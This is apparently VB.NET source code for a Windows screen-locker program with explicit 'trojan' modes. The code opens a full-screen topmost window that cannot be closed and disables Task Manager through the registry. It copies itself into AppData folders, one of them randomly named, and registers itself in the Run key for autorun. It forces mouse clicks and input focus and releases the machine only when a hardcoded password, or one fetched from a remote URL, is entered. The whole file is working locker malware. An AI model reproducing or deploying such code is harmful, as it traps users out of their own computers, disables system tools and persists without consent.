Imports System.Runtime.InteropServices
'Imports System.Drawing.Imaging

Public Class frmMain

#Region "Implementation"
    'small workaround for gif animation (doesn't work with BackgroundImage)
    'Dim animGif As Image
    'Dim Index As Integer = 0
    'Private Sub anim_Workaround_Tick(sender As Object, e As EventArgs) Handles anim_Workaround.Tick
    '    animGif.SelectActiveFrame(New FrameDimension(animGif.FrameDimensionsList(0)), Index)
    '    Me.BackgroundImage = animGif
    '    Index = Index + 1
    '    If Index = animGif.GetFrameCount(New FrameDimension(animGif.FrameDimensionsList(0))) Then
    '        Index = 0
    '    End If
    'End Sub

    'video playback (doesn't work 'cause of glass feature)
    'Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    'Const WS_CHILD As Integer = &H40000000
    'Private Sub PlayMedia(ByRef FileName As String, ByVal Window As Control)
    '    FileName = Chr(34) & FileName & Chr(34)
    '    mciSendString("Open " & FileName & " alias MediaFile parent " & CStr(Window.Handle.ToInt32) & " style " & CStr(WS_CHILD), Nothing, 0, 0)
    '    mciSendString("put MediaFile window at 0 0 " & CStr(PixelToTwip(Window.ClientRectangle.Width) / 15) & " " & CStr(PixelToTwip(Window.ClientRectangle.Height) / 15), Nothing, 0, 0)
    '    mciSendString("Play MediaFile", Nothing, 0, 0)
    'End Sub
    'Private Function PixelToTwip(ByVal Pixel As Integer) As Double
    '    Return Pixel * 15
    'End Function
    'Private Sub frmMain_Video_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
    '    If My.Computer.FileSystem.FileExists(structurePath & "video.mp4") = True Then
    '        Dim myPic As New PictureBox()
    '        myPic.Dock = DockStyle.Fill
    '        Me.Controls.Add(myPic)
    '        PlayMedia(structurePath & "video.mp4", myPic)
    '    End If
    'End Sub

    'to get current keyboard language: 1049 - RUS, 1033 - ENG
    <DllImport("user32.dll", SetLastError:=True)> _
    Private Shared Function GetWindowThreadProcessId(<[In]()> hWnd As IntPtr, <Out(), [Optional]()> lpdwProcessId As IntPtr) As Integer
    End Function
    <DllImport("user32.dll", SetLastError:=True)> _
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function
    <DllImport("user32.dll", SetLastError:=True)> _
    Private Shared Function GetKeyboardLayout(<[In]()> idThread As Integer) As UShort
    End Function
    Private Function GetKeyboardLayout() As UShort
        Return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero))
    End Function
#End Region

    ''Important declarations
    '
    Dim sr As System.IO.StreamReader
    Dim WithEvents wc As New System.Net.WebClient

    'left mouse button
    Private Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)

    'some global variables
    Dim structurePath As String = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) & "\" & CompanyName & "\" & ProductName & "\"
    Dim quitAllow As Byte = 0 '0/1, 1 - program can be terminated, 0 - program can not
    Dim modeTrojan As Byte = 0 '0/1
    Dim modeTrojanHard As Byte = 0 '0/1
    Dim btsoUrl As String = "https://preview.cubby.com/pl/BtsO_password.txt/_6c3d09bccd7e43ce9537bb09c4823006"
    Dim svt_you_may_pass_b As String = "12369877896321555"
    Dim svt_you_may_pass As String = svt_you_may_pass_b
    Dim txtboxWasChanged As Byte = 0 '0/1, 1 - prohibit program to load new pass, 0 - do nothing

    'glass feature
    <Runtime.InteropServices.StructLayout(Runtime.InteropServices.LayoutKind.Sequential)> Public Structure MARGINS
        Public LeftWidth As Integer
        Public RightWidth As Integer
        Public TopHeight As Integer
        Public Buttomheight As Integer
    End Structure
    <Runtime.InteropServices.DllImport("dwmapi.dll")> Public Shared Function DwmExtendFrameIntoClientArea(ByVal hWnd As IntPtr, ByRef pMarinset As MARGINS) As Integer
    End Function

    'random
    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
        Static Generator As System.Random = New System.Random()
        Return Generator.Next(Min, Max + 1)
    End Function
    ' | for position
    'Dim rndValX As Short = 0
    'Dim rndValY As Short = 0

    'admin
    Private Function veAdmin()
        Try
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "By Svetomech", "veAdmin")
        Catch ex As Exception
            Return False
        End Try
        Dim svt As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        svt.DeleteValue("By Svetomech", False)
        Return True
    End Function
    ''

    ''FIXES:
    '
    'fix2 - exit only with task manager or program method
    Private Sub frmMain_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If Not quitAllow = 1 Then e.Cancel = True
    End Sub
    ''

    ''Loads the main function
    '
    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'picture perfect pony... joking
        '  it's actually picture (or glass) only mode
        '  no hope for you to escape
        If modeTrojanHard = 1 Then
            TextBox1.Dispose()
        End If

        'glass feature
        Try
            Me.TransparencyKey = Color.Cyan 'USE THIS COLOUR ONLY HERE (or change it)
            Me.BackColor = Color.Cyan 'USE THIS COLOUR ONLY HERE (or change it)
            Dim margins As MARGINS = New MARGINS
            margins.LeftWidth = -1
            margins.RightWidth = -1
            margins.TopHeight = -1
            margins.Buttomheight = -1
            Dim result As Integer = DwmExtendFrameIntoClientArea(Me.Handle, margins)
        Catch ex As Exception
            MsgBox("I just don't know what went wrong ◴_◶" & Err.Description, vbCritical, "Derp!")
            quitAllow = 1
            Application.Exit()
        End Try

        'fs
        If modeTrojan = 1 Or modeTrojanHard = 1 Then
            structurePath = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData) & "\{" & GetRandom(10000000, 99999999) & "}\"
        End If
        IO.Directory.CreateDirectory(structurePath)
        If IO.Directory.Exists("svt_structure") = True Then My.Computer.FileSystem.MoveDirectory("svt_structure", structurePath, True)

        'gui background
        If modeTrojan = 0 And modeTrojanHard = 0 Then
            If My.Computer.FileSystem.FileExists(structurePath & "anim.gif") = True Then
                Me.BackgroundImage = Image.FromFile(structurePath & "anim.gif")
                'animGif = Image.FromFile(structurePath & "anim.gif")
                'anim_Workaround.Start()
            End If
            'If My.Computer.FileSystem.FileExists(structurePath & "anim.vb.png") = True Then

            'End If
            If My.Computer.FileSystem.FileExists(structurePath & "image.png") = True Then
                Me.BackgroundImage = Image.FromFile(structurePath & "image.png")
            End If
            'If My.Computer.FileSystem.FileExists(structurePath & "sound.mp3") = True Then

            'End If
            'If My.Computer.FileSystem.FileExists(structurePath & "video.mp4") = True Then

            'End If
        End If

        'copy itself to fs folder
        If Not My.Computer.FileSystem.FileExists(structurePath & My.Application.Info.AssemblyName & ".exe") = True Then
            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, structurePath & My.Application.Info.AssemblyName & ".exe")
        Else
            Dim Info As FileVersionInfo
            Info = FileVersionInfo.GetVersionInfo(structurePath & My.Application.Info.AssemblyName & ".exe")
            If Not ProductVersion = Info.ProductVersion Then
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, structurePath & My.Application.Info.AssemblyName & ".exe", True)
            End If
        End If

        'autorun
        If modeTrojan = 0 And modeTrojanHard = 0 Then
            If Not My.Computer.FileSystem.FileExists(structurePath & "friend.svetomech") = True Then
                If veAdmin() = True Then
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", ProductName, structurePath & My.Application.Info.AssemblyName & ".exe")
                    'My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", ProductName, structurePath & My.Application.Info.AssemblyName & ".exe")
                Else
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", ProductName, structurePath & My.Application.Info.AssemblyName & ".exe")
                End If
            End If
        Else
            If veAdmin() = True Then
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", ProductName, structurePath & My.Application.Info.AssemblyName & ".exe")
                'My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", ProductName, structurePath & My.Application.Info.AssemblyName & ".exe")
            Else
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", ProductName, structurePath & My.Application.Info.AssemblyName & ".exe")
            End If
        End If

        'disable task manager
        If veAdmin() = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\", "DisableTaskMgr", 1)
        End If

        ' | for position - using
        'rndValX = GetRandom(Screen.PrimaryScreen.Bounds.Height / 10, Screen.PrimaryScreen.Bounds.Width / 2)
        'rndValY = GetRandom(Screen.PrimaryScreen.Bounds.Height / 10, Screen.PrimaryScreen.Bounds.Width / 2)
        'rndValX = GetRandom(0, Screen.PrimaryScreen.Bounds.Width)
        'rndValY = GetRandom(0, Screen.PrimaryScreen.Bounds.Height)
        'TextBox1.Location = New Point(rndValX, rndValY)

        'fit the width
        Me.Size = New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Me.Location = New Point(0, 0)
        TextBox1.Size = New Size(Screen.PrimaryScreen.WorkingArea.Width, 20)

        'to the right screen corner #1
        Dim x As Integer
        Dim y As Integer
        x = Screen.PrimaryScreen.WorkingArea.Width
        y = Screen.PrimaryScreen.WorkingArea.Height - TextBox1.Height
        Do Until x = Screen.PrimaryScreen.WorkingArea.Width - TextBox1.Width
            x = x - 1
            TextBox1.Location = New Point(x, y)
        Loop

        'to the right screen corner #2
        'Dim x As Integer
        'Dim y As Integer
        'x = Screen.PrimaryScreen.WorkingArea.Width - TextBox1.Width
        'y = Screen.PrimaryScreen.WorkingArea.Height - TextBox1.Height
        'TextBox1.Location = New Point(x, y)
    End Sub
    ''

    ''Main function
    '
    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        If txtboxWasChanged = 0 Then
            If modeTrojan = 1 Then
                Try
                    svt_you_may_pass = wc.DownloadString(New Uri(btsoUrl))
                Catch ex As Exception
                    svt_you_may_pass = svt_you_may_pass_b
                End Try
                If svt_you_may_pass = " " Then svt_you_may_pass = svt_you_may_pass_b
            Else
                If My.Computer.FileSystem.FileExists(structurePath & "cache.dat") = True Then
                    sr = New IO.StreamReader(structurePath & "cache.dat")
                    svt_you_may_pass = sr.ReadLine()
                    sr.Close()
                    If svt_you_may_pass = " " Then svt_you_may_pass = svt_you_may_pass_b
                End If
            End If
        End If

        txtboxWasChanged = 1
    End Sub

    Private Sub TextBox1_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyUp
        Try
            If e.KeyValue = Keys.Enter Then

                If TextBox1.Text = svt_you_may_pass Then
                    'no autorun
                    If modeTrojan = 1 Then
                        If veAdmin() = True Then
                            Dim svt As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                            svt.DeleteValue(ProductName, False)
                            svt = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                            svt.DeleteValue(ProductName, False)
                        Else
                            Dim svt As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                            svt.DeleteValue(ProductName, False)
                        End If
                    End If

                    'enable task manager
                    If veAdmin() = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\", "DisableTaskMgr", 0)
                    End If

                    quitAllow = 1
                    Application.Exit()
                End If

            End If
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Sub
    ''

    ''Some tricks
    '
    'to avoid being exploited #
    Private Sub mainFunct_Workaround_Tick(sender As Object, e As EventArgs) Handles mainFunct_Workaround.Tick
        Me.TopMost = True
        mouse_event(&H2, 850, 13, 0, 0) 'LMB hold
        mouse_event(&H4, 850, 13, 0, 0) 'LMB release

        'fix3 - from implementation
        If GetKeyboardLayout() = 1049 Then
            System.Windows.Forms.InputLanguage.CurrentInputLanguage = InputLanguage.FromCulture(System.Globalization.CultureInfo.GetCultureInfo(1033))
        End If

        TextBox1.Focus()
    End Sub

    'fix4 - hides the textbox
    Private Sub TextBox1_MouseEnter(sender As Object, e As EventArgs) Handles TextBox1.MouseEnter
        TextBox1.Visible = False
        TextBox1.Enabled = False
    End Sub
    'fix4 - shows the textbox
    Private Sub TextBox1_MouseLeave(sender As Object, e As EventArgs) Handles TextBox1.MouseLeave
        TextBox1.Enabled = True
        TextBox1.Visible = True
    End Sub
    ''
End Class